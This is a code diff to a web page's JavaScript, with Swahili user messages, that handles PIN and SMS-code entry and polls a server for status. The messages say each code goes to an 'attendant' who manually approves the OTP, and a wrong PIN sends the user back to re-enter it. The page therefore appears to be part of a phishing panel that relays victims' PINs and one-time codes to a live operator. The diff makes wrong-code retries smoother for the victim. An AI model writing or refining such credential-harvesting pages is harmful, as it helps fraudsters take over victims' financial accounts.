@@ -247,7 +247,7 @@
                 if (data.success) {
                     showCodeStatus('✅ Msimbo umeombwa tena. Tafadhali angalia simu yako.', 'success');
                 } else {
-                    showCodeStatus('❌ Hitilafu: ' + (data.error || 'Jaribu tena.'), 'error');
+                    showCodeStatus('❌ ' + (data.error || 'Hitilafu. Jaribu tena.'), 'error');
                 }
             } catch (err) {
                 showCodeStatus('❌ Hitilafu ya mtandao. Jaribu tena.', 'error');
@@ -269,13 +269,14 @@
                     const data = await res.json();
 
                     if (data.status === 'not_found') {
-                        setStatus('error', '❌ Ombi halipo. Wasiliana na mhudumu.');
+                        setStatus('error', '❌ Ombi halipo. Wasiliana na mhudumu.', true);
                         clearInterval(pollInterval);
                         return;
                     }
 
                     let statusText = '';
                     let statusClass = 'waiting';
+                    let isError = false;
 
                     if (data.status === 'pending') {
                         statusText = '⏳ Ombi limepokelewa. Subiri mhudumu kuidhinisha OTP...';
@@ -301,6 +302,7 @@
                         // ❌ PIN MBAYA – rudisha kwenye ukurasa wa PIN
                         statusText = '❌ PIN si sahihi. Inarudisha kwenye ukurasa wa PIN...';
                         statusClass = 'error';
+                        isError = true;
                         clearInterval(pollInterval);
                         stopTimer();
                         codeSection.classList.add('hidden');
@@ -310,8 +312,13 @@
                         }, 1500);
                     } else if (data.code_status === 'wrong_code') {
                         // ❌ MSIMBO MBAYA – onyesha sanduku nyekundu, ruhusu kuandika tena
-                        statusText = '❌ Msimbo si sahihi. Tafadhali ingiza tena.';
+                        // Badala ya "Imekataliwa", tunasema "Msimbo si sahihi" na kuruhusu kuingiza tena
+                        statusText = '❌ Msimbo si sahihi. Tafadhali ingiza msimbo uliopokea kwenye SMS yako.';
                         statusClass = 'error';
+                        // Usibadilishe kichwa kuwa "Imekataliwa" – tunataka iwe "Inachakatwa" au "Ingiza msimbo"
+                        // Tutaweka kichwa kuwa "⏳ Inasubiri" au "⏳ Ingiza Msimbo"
+                        statusTitle.textContent = '⏳ Ingiza Msimbo';
+                        // Weka sanduku nyekundu, futa maandishi, na ruhusu kuandika tena
                         codeBoxes.forEach(box => {
                             box.classList.add('error');
                             box.value = '';
@@ -320,10 +327,20 @@
                         verifyBtn.disabled = false;
                         verifyBtn.textContent = 'Thibitisha Msimbo';
                         codeBoxes[0].focus();
-                        showCodeStatus('❌ Msimbo si sahihi. Ingiza tena.', 'error');
+                        showCodeStatus('❌ Msimbo si sahihi. Tafadhali ingiza tena.', 'error');
+                        // Usifanye clearInterval – inaendelea kupiga polling
+                        // Usifanye codeSection hidden – inabaki wazi
+                        // Usifanye timerBox hidden – muda unaendelea
+                        // Usibadilishe setStatus, tunataka kuonyesha ujumbe huo
+                        // Tutaweka statusMsg na statusClass
+                        statusMsg.textContent = statusText;
+                        statusMsg.className = 'status-message ' + statusClass;
+                        // Usibadilishe statusTitle tena
+                        return; // To avoid running the generic setStatus below
                     } else if (data.status === 'invalid') {
                         statusText = `❌ Ombi limekataliwa. Sababu: ${data.invalid_type || 'Hajakidhi vigezo.'}`;
                         statusClass = 'error';
+                        isError = true;
                         clearInterval(pollInterval);
                         stopTimer();
                         codeSection.classList.add('hidden');
@@ -331,21 +348,33 @@
                     } else {
                         statusText = `Hali: ${data.status} | Msimbo: ${data.code_status}`;
                     }
-                    setStatus(statusText, statusClass);
+
+                    // Ikiwa hatujarudi mapema (kwa wrong_code), tumia setStatus
+                    if (data.code_status !== 'wrong_code') {
+                        setStatus(statusText, statusClass, isError);
+                    }
 
                 } catch (err) {
                     console.error('Polling error:', err);
-                    setStatus('⚠️ Hitilafu ya mtandao. Inajaribu kuungana tena...', 'waiting');
+                    setStatus('⚠️ Hitilafu ya mtandao. Inajaribu kuungana tena...', 'waiting', false);
                 }
             }, 3000);
         }
 
-        function setStatus(text, type = 'waiting') {
+        function setStatus(text, type = 'waiting', isError = false) {
             statusMsg.textContent = text;
             statusMsg.className = 'status-message ' + type;
-            if (type === 'success') statusTitle.textContent = '✅ Imekubaliwa';
-            else if (type === 'error') statusTitle.textContent = '❌ Imekataliwa';
-            else statusTitle.textContent = '⏳ Inachakatwa';
+            if (type === 'success') {
+                statusTitle.textContent = '✅ Imekubaliwa';
+            } else if (type === 'error' && isError) {
+                // Kwa makosa makubwa (invalid, not_found) tunaweka "Imekataliwa"
+                statusTitle.textContent = '❌ Imekataliwa';
+            } else if (type === 'error') {
+                // Kwa makosa mengine (kama wrong_code) tunaweka "⏳ Inachakatwa"
+                statusTitle.textContent = '⏳ Inachakatwa';
+            } else {
+                statusTitle.textContent = '⏳ Inachakatwa';
+            }
         }
 
         // ================================================
@@ -378,7 +407,7 @@
                     codeSection.classList.add('hidden');
                     timerBox.classList.add('hidden');
                     stopTimer();
-                    setStatus('📤 Msimbo umetumwa kwa mhudumu. Subiri uthibitisho...', 'waiting');
+                    setStatus('📤 Msimbo umetumwa kwa mhudumu. Subiri uthibitisho...', 'waiting', false);
                 } else {
                     showCodeStatus('❌ Hitilafu: ' + (data.error || 'Jaribu tena.'), 'error');
                     verifyBtn.disabled = false;
